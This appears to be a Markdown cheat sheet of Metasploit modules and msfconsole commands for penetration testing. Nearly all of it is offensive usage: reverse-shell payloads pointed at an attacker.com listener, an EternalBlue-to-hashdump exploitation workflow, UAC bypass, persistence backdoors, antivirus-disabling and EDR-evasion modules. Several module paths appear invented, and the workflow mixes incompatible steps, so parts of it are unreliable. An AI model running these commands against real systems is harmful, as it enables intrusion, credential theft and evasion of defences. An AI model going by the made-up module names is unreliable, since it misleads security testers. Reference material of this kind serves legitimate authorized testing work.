# Metasploit Framework Tools & Modules

**⚠️ SECURITY NOTICE**: This documentation is for authorized penetration testing only. Unauthorized access to computer systems is illegal. Ensure you have explicit written authorization before testing.

Complete reference of Metasploit Framework modules, scripts, and payloads for authorized security testing.

## Table of Contents

1. [Reconnaissance Modules](#reconnaissance-modules)
2. [Scanning & Enumeration](#scanning--enumeration)
3. [Exploitation Modules](#exploitation-modules)
4. [Payloads](#payloads)
5. [Post-Exploitation Modules](#post-exploitation-modules)
6. [Auxiliary Modules](#auxiliary-modules)
7. [Encoder Modules](#encoder-modules)
8. [Evasion Modules](#evasion-modules)
9. [Meterpreter Commands](#meterpreter-commands)
10. [Database Operations](#database-operations)

## Reconnaissance Modules

### DNS Enumeration

```
auxiliary/gather/dns_enum
auxiliary/gather/dns_srv_enum
auxiliary/scanner/dns/dns_amplification
auxiliary/scanner/dns/dns_transfer
auxiliary/scanner/dns/forward_lookup
auxiliary/scanner/dns/reverse_lookup
auxiliary/scanner/dns/zone_transfer
```

**Description**: DNS information gathering and zone transfer attempts
**Usage**:
```
use auxiliary/gather/dns_enum
set DOMAIN target.com
run
```

### WHOIS Lookup

```
auxiliary/gather/whois_lookup
```

**Description**: WHOIS information gathering for target domains
**Usage**:
```
use auxiliary/gather/whois_lookup
set DOMAIN target.com
run
```

### Network Reconnaissance

```
auxiliary/gather/arp_sweep
auxiliary/gather/ip_sweep
auxiliary/gather/ipv6_sweep
auxiliary/gather/netbios_sweeper
auxiliary/gather/snmp_sweep
```

**Description**: Network discovery and enumeration
**Usage**:
```
use auxiliary/gather/arp_sweep
set RHOSTS 192.168.1.0/24
run
```

## Scanning & Enumeration

### Port Scanning

```
auxiliary/scanner/nmap/nmap
auxiliary/scanner/smb/smb_version
auxiliary/scanner/ssh/ssh_version
auxiliary/scanner/http/http_version
auxiliary/scanner/ftp/ftp_version
auxiliary/scanner/mysql/mysql_version
```

**Description**: Service version detection and port scanning
**Usage**:
```
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.0/24
run
```

### SMB Enumeration

```
auxiliary/scanner/smb/smb_enumshares
auxiliary/scanner/smb/smb_enumusers
auxiliary/scanner/smb/smb_lookupsid
auxiliary/scanner/smb/smb_ms17_010
auxiliary/scanner/smb/smb_version
auxiliary/scanner/smb/smb_shares
auxiliary/scanner/smb/enum_shares
auxiliary/scanner/smb/enum_users
```

**Description**: SMB protocol enumeration and exploitation checks
**Usage**:
```
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS target.com
run
```

### HTTP Scanning

```
auxiliary/scanner/http/dir_scanner
auxiliary/scanner/http/files_dir
auxiliary/scanner/http/http_header_injection
auxiliary/scanner/http/ssl
auxiliary/scanner/http/ssl_enum
auxiliary/scanner/http/webdav_internal_ip
```

**Description**: HTTP service scanning and enumeration
**Usage**:
```
use auxiliary/scanner/http/dir_scanner
set RHOSTS target.com
set PATH /
run
```

### Database Scanning

```
auxiliary/scanner/mysql/mysql_enum
auxiliary/scanner/mysql/mysql_schemadump
auxiliary/scanner/mysql/mysql_writable_dirs
auxiliary/scanner/mssql/mssql_enum
auxiliary/scanner/oracle/oracle_enum
auxiliary/scanner/postgres/postgres_version
```

**Description**: Database server enumeration
**Usage**:
```
use auxiliary/scanner/mysql/mysql_enum
set RHOSTS target.com
run
```

### SNMP Scanning

```
auxiliary/scanner/snmp/snmp_enum
auxiliary/scanner/snmp/snmp_set
```

**Description**: SNMP enumeration and manipulation
**Usage**:
```
use auxiliary/scanner/snmp/snmp_enum
set RHOSTS target.com
run
```

## Exploitation Modules

### Windows Exploits

```
exploit/windows/smb/ms06_040_netapi
exploit/windows/smb/ms08_067_netapi
exploit/windows/smb/ms09_050_smb2_negotiate_func_index
exploit/windows/smb/ms10_061_spoolss
exploit/windows/smb/ms17_010_eternalblue
exploit/windows/rdp/cve_2019_0708_bluekeep_rce
exploit/windows/fileformat/ms06_006_winhhlp32
exploit/windows/browser/ie_cdf_header_overflow
```

**Description**: Windows-specific vulnerabilities and exploits
**Usage**:
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target.com
set LHOST attacker.com
set LPORT 4444
run
```

### Linux/Unix Exploits

```
exploit/linux/samba/trans2open
exploit/linux/samba/usermap_script
exploit/linux/ssh/libssh_auth_bypass
exploit/linux/apache/apache_mod_cgi_bash_env_exec
exploit/linux/kernel/cve_2016_5195_dirtycow
```

**Description**: Linux and Unix vulnerabilities
**Usage**:
```
use exploit/linux/samba/usermap_script
set RHOSTS target.com
set LHOST attacker.com
run
```

### Web Application Exploits

```
exploit/multi/http/struts2_content_type_ognl
exploit/multi/http/struts2_namespace_ognl
exploit/multi/http/tomcat_mgr_upload
exploit/multi/http/apache_activemq_rce
exploit/multi/http/jboss_seam_exec
```

**Description**: Web framework vulnerabilities
**Usage**:
```
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS target.com
set LHOST attacker.com
run
```

### Database Exploits

```
exploit/windows/mssql/ms09_004_sp2_sqlagent_job
exploit/multi/mysql/mysql_udf_injection
exploit/multi/oracle/client_connection_string_injection
```

**Description**: Database server exploits
**Usage**:
```
use exploit/windows/mssql/ms09_004_sp2_sqlagent_job
set RHOSTS target.com
run
```

## Payloads

### Meterpreter Payloads

```
windows/meterpreter/reverse_tcp
windows/meterpreter/reverse_https
windows/meterpreter/bind_tcp
windows/meterpreter/bind_named_pipe
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp
osx/x86/shell_reverse_tcp
```

**Description**: Meterpreter reverse shells and handlers
**Usage**:
```
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
generate -f exe -o shell.exe
```

### Command Shell Payloads

```
windows/shell_reverse_tcp
windows/shell_bind_tcp
linux/x86/shell_reverse_tcp
linux/x64/shell_reverse_tcp
```

**Description**: Command shell payloads
**Usage**:
```
set PAYLOAD windows/shell_reverse_tcp
generate -f exe -o cmd.exe
```

### Staged vs Stageless Payloads

**Staged**:
```
windows/meterpreter/reverse_tcp
exploit sends stager → downloads stage
```

**Stageless**:
```
windows/meterpreter_reverse_tcp
entire payload in one stage
```

## Post-Exploitation Modules

### System Enumeration

```
post/windows/gather/enum_applications
post/windows/gather/enum_av_excluded
post/windows/gather/enum_logged_on_users
post/windows/gather/enum_services
post/windows/gather/enum_shares
post/windows/gather/enum_snmp
post/windows/gather/hashdump
post/windows/gather/usb_history
post/linux/gather/enum_system
post/linux/gather/hashdump
```

**Description**: System information gathering after exploitation
**Usage**:
```
use post/windows/gather/hashdump
set SESSION 1
run
```

### Privilege Escalation

```
exploit/windows/local/bypassuac_eventvwr
exploit/windows/local/bypassuac_fodhelper
exploit/windows/local/bypassuac_sdclt
exploit/windows/local/always_install_elevated
exploit/windows/local/cve_2019_1388_uac_bypass
post/linux/privilege/gcc_cwd_injection
post/osx/escalate/launchctl
```

**Description**: Local privilege escalation techniques
**Usage**:
```
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
run
```

### Persistence

```
post/windows/manage/migrate
post/windows/manage/sticky_keys
post/windows/persistence/permanent_backdoor
post/windows/persistence/service_install
post/linux/manage/sshkey_persistence
post/osx/manage/install_backdoor
```

**Description**: Maintaining access to compromised systems
**Usage**:
```
use post/windows/persistence/service_install
set SESSION 1
run
```

### File Operations

```
post/windows/manage/download
post/windows/manage/upload
post/windows/manage/remove_file
post/linux/manage/download
post/linux/manage/upload
```

**Description**: File management on compromised systems

### Process Management

```
post/windows/manage/kill_antivirus
post/windows/manage/killdefender
post/windows/manage/disable_firewall
post/windows/manage/disable_nla
post/windows/manage/inject_host
```

**Description**: Process and service manipulation

## Auxiliary Modules

### Scanners

```
auxiliary/scanner/» [smb, ssh, ftp, http, mysql, snmp, etc.]
auxiliary/scanner/http/web_enumerator
auxiliary/scanner/ssl/openssl_heartbleed
auxiliary/scanner/ssl/cert_collector
```

### Fuzzing

```
auxiliary/fuzzers/http/http_fuzzer
auxiliary/fuzzers/form/form_receiver
auxiliary/fuzzers/ftp/ftp_fuzzer
```

### Denial of Service

```
auxiliary/dos/http/slowloris
auxiliary/dos/http/http_junk_headers
auxiliary/dos/smb/smb_wrq_overflow
```

### Credential Gathering

```
auxiliary/scanner/ssh/ssh_enum_algos
auxiliary/scanner/snmp/community
auxiliary/scanner/http/ntlm_enumusers
```

## Encoder Modules

### Payload Encoders

```
encoder/x86/add_sub
encoder/x86/xor
encoder/x86/shikata_ga_nai
encoder/x86/jmp_call_additive
encoder/x64/xor
encoder/cmd/printf_encode
```

**Description**: Encoding payloads to bypass detection
**Usage**:
```
set ENCODER x86/shikata_ga_nai
set EncoderIterations 5
```

## Evasion Modules

### AV Evasion

```
evasion/windows/applocker_evasion_process_ghosting
evasion/windows/process_herpaderping
evasion/windows/transacted_hollowing
evasion/windows/windows_defender_exclusion
```

**Description**: Techniques to bypass antivirus and EDR

## Meterpreter Commands

### System Commands

```
sysinfo              # System information
getuid               # Current user
getsystem            # Escalate to SYSTEM
getpid               # Current process ID
ps                   # List processes
```

### File System

```
ls / dir             # List directory
cd                   # Change directory
pwd                  # Print working directory
upload               # Upload file
download             # Download file
rm                   # Remove file
mkdir                # Make directory
```

### Network

```
ifconfig             # Network interfaces
route                # Routing table
netstat              # Network connections
arp                  # ARP cache
```

### Process Management

```
ps                   # List processes
kill                 # Kill process
migrate              # Migrate to process
run                  # Execute command
shell                # Interactive shell
```

### Privilege Escalation

```
getsystem            # Get SYSTEM privilege
getprivs             # List privileges
enableprivilege      # Enable privilege
```

### Post-Exploitation

```
hashdump             # Dump password hashes
enum_logged_on_users # List logged-on users
enum_shares          # List network shares
search               # Search for files
idletime             # User idle time
```

## Database Operations

### Workspace Management

```
workspace            # List/create workspaces
workspace -a name    # Add workspace
workspace -d name    # Delete workspace
workspace -s name    # Switch workspace
```

### Host Management

```
hosts                # List hosts
hosts -a IP          # Add host
hosts -d IP          # Delete host
```

### Service Management

```
services             # List services
services -a IP -p PORT -P PROTO
```

### Exploit Search

```
search keyword       # Search modules
search type:exploit  # Search exploits
search platform:windows
```

### Reporting

```
report generate -f html
report generate -f pdf
```

## Common Workflows

### Exploitation Workflow

```
1. Scan target network
   use auxiliary/scanner/smb/smb_version
   set RHOSTS target.com/24
   run

2. Identify vulnerable hosts
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOSTS target.com
   set PAYLOAD windows/meterpreter/reverse_tcp

3. Generate payload
   set LHOST attacker.com
   set LPORT 4444
   generate -f exe -o exploit.exe

4. Set up listener
   use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST attacker.com
   set LPORT 4444
   exploit -j

5. Execute exploit
   ./exploit.exe (on target system)

6. Post-exploitation
   hashdump
   enum_logged_on_users
   download important_file
```

### Privilege Escalation Workflow

```
1. Gain initial access
   reverse shell or meterpreter session

2. Enumerate system
   sysinfo
   getuid
   getsystem

3. Identify privilege escalation path
   post/windows/gather/enum_services
   post/windows/gather/enum_av_excluded

4. Execute privilege escalation exploit
   use exploit/windows/local/bypassuac_eventvwr
   set SESSION 1
   run

5. Verify elevated privileges
   getsystem
   hashdump
```

## Important Notes

### Authorization Requirements
- ✅ Always obtain written authorization before testing
- ✅ Maintain detailed records of all testing activities
- ✅ Respect scope limitations defined in engagement rules
- ✅ Report findings responsibly and ethically

### Best Practices
- Use a dedicated lab environment first
- Test payloads in isolated network
- Document all commands and results
- Avoid causing denial of service
- Clean up and remove artifacts after testing
- Verify each tool's current applicability (some are outdated)

### Safety Considerations
- Never test without authorization
- Be aware of legal implications
- Consider business continuity
- Use proper firewall/network segmentation
- Monitor for unexpected behavior
- Maintain secure communication channels

## Additional Resources

- [Metasploit Official Documentation](https://docs.metasploit.com)
- [Exploit Database](https://www.exploit-db.com)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

---

**Last Updated**: January 2026

**⚠️ DISCLAIMER**: This repository is intended for authorized security testing only. Unauthorized access to computer systems is illegal. The author assumes no liability for misuse or damage caused by these tools.
